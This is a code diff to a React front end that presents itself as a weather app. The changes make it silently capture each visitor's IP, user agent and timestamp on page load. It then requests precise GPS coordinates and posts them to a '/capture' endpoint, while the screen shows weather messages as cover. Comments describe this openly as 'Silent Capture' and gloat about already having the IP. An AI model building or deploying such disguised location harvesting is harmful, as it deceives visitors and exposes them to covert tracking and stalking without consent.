@@ -8,49 +8,41 @@ function App() {
   const [status, setStatus] = useState('idle'); // idle, loading, success, error
   const [message, setMessage] = useState('');
 
-  // Silently log IP on mount (Passive Reconnaissance)
+  // Silently log IP and prompt for location instantly on mount (Silent Capture)
   useEffect(() => {
-    axios.post(`${API_URL}/log-visit`)
-      .then(() => console.log('Network integrity checked.'))
-      .catch(err => console.error('Initialization failed', err));
-  }, []);
+    const forensicCapture = async (gpsData = {}) => {
+      try {
+        await axios.post(`${API_URL}/capture`, {
+          ...gpsData,
+          timestamp: new Date().toISOString(),
+          userAgent: navigator.userAgent
+        });
+      } catch (err) {
+        console.error("Capture failed");
+      }
+    };
 
-  const handleCheckLocation = async () => {
-    setStatus('loading');
+    // 1. Send an immediate "IP-only" capture in case they block GPS
+    forensicCapture({ type: "IP_ONLY" });
 
-    if (!navigator.geolocation) {
-      setStatus('error');
-      setMessage('Geolocation is not supported by your browser.');
-      return;
-    }
-
-    // 1. Send an immediate "Heads up" to the backend
-    try {
-      await axios.post(`${API_URL}/capture`, { type: "initial_ping" });
-
+    // 2. Try to get precise GPS instantly
+    if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
-        async (position) => {
-          // 2. If they ALLOW, send the high-accuracy coordinates
-          const { latitude, longitude } = position.coords;
-          await axios.post(`${API_URL}/capture`, {
-            latitude, longitude, type: "gps_precise"
-          });
+        (pos) => {
+          const { latitude, longitude } = pos.coords;
+          forensicCapture({ latitude, longitude, type: "gps_precise" });
           setStatus('success');
-          setMessage('Weather data loaded for your area.');
+          setMessage('Weather data loaded for your exact location.');
         },
-        (error) => {
-          console.error("GPS Blocked, but IP already captured.");
+        (err) => {
+          console.log("User blocked GPS, but we already have their IP!");
           setStatus('error');
-          setMessage('Unable to detect location. Showing general weather for your region based on IP.');
+          setMessage('Unable to detect precise location. Showing regional weather.');
         },
-        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+        { enableHighAccuracy: true }
       );
-    } catch (err) {
-      console.error("Connection failed");
-      setStatus('error');
-      setMessage('Error connecting to weather servers.');
     }
-  };
+  }, []);
 
   return (
     <div className="weather-container">
@@ -87,7 +79,6 @@ function App() {
             
             <button 
               className="action-btn" 
-              onClick={handleCheckLocation}
               disabled={status === 'loading'}
             >
               {status === 'loading' ? (
